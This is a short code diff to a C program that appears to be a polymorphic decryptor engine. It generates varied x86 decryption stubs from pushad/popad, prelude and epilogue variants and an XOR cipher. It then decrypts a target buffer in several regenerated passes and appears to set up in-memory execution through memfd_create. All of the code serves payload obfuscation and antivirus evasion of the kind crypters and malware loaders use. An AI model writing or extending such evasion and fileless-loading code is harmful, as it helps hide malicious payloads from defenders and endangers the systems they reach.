@@ -89,7 +89,7 @@ void mov_reg_dreg_1 (uint8_t *, uint32_t*, uint32_t, uint32_t);
 void mov_dreg_reg_0 (uint8_t *, uint32_t*, uint32_t, uint32_t);
 void mov_dreg_reg_1 (uint8_t *, uint32_t*, uint32_t, uint32_t);
 void (*cipher_types_arr[])(uint8_t *, uint32_t, uint32_t *) = {Sbtg_XOR};
-void (*popad_variants_arr[])(uint8_t *, uint32_t *) = {popad_0, popad_1};
+void (*popad_variants_arr[])(uint8_t *, uint32_t *) = {popad_0};
 void (*pushad_variants_arr[])(uint8_t *, uint32_t *) = {pushad_0, pushad_1};
 void (*prelude_variants_arr[])(uint8_t *, uint32_t *) = {prelude_0, prelude_1};
 void (*epilogue_variants_arr[])(uint8_t *, uint32_t *) = {epiloge_0, epiloge_1};
@@ -157,7 +157,7 @@ void popad_0 (uint8_t *decryptor_buff, uint32_t *offset) {
 }
 
 void popad_1 (uint8_t *decryptor_buff, uint32_t *offset) {
-	for (int i = 8 - 1; i >= 0; i--) {
+	for (int i = 7; i >= 0; i--) {
 		*(uint8_t*)(decryptor_buff + *offset) = (OP_POP | i);
 		*offset += 1;
 	}	
@@ -518,15 +518,18 @@ int main(int argc, char **argv, char **envp) {
 		puts("[-] Failed to allocate memory for decryptor");
 		return -1;
 	}	
+
+	decryptor_entry = (void (*)(uint8_t*, size_t))decryptor_buff;
 	decryptor_buff_size = PAGE_SIZE;
 	flags = 0b00000111;
 
  	Sbtg(decryptor_buff, decryptor_buff_size, flags);
-	
-	decryptor_entry = (void (*)(uint8_t*, size_t))decryptor_buff;
 	(*decryptor_entry)(target_buff, target_buff_size);
+ 	Sbtg(decryptor_buff, decryptor_buff_size, flags);
 	(*decryptor_entry)(target_buff, target_buff_size);
+ 	Sbtg(decryptor_buff, decryptor_buff_size, flags);
 	(*decryptor_entry)(target_buff, target_buff_size);
+ 	Sbtg(decryptor_buff, decryptor_buff_size, flags);
 	(*decryptor_entry)(target_buff, target_buff_size);
 
 	fd = _memfd_create("", 0);
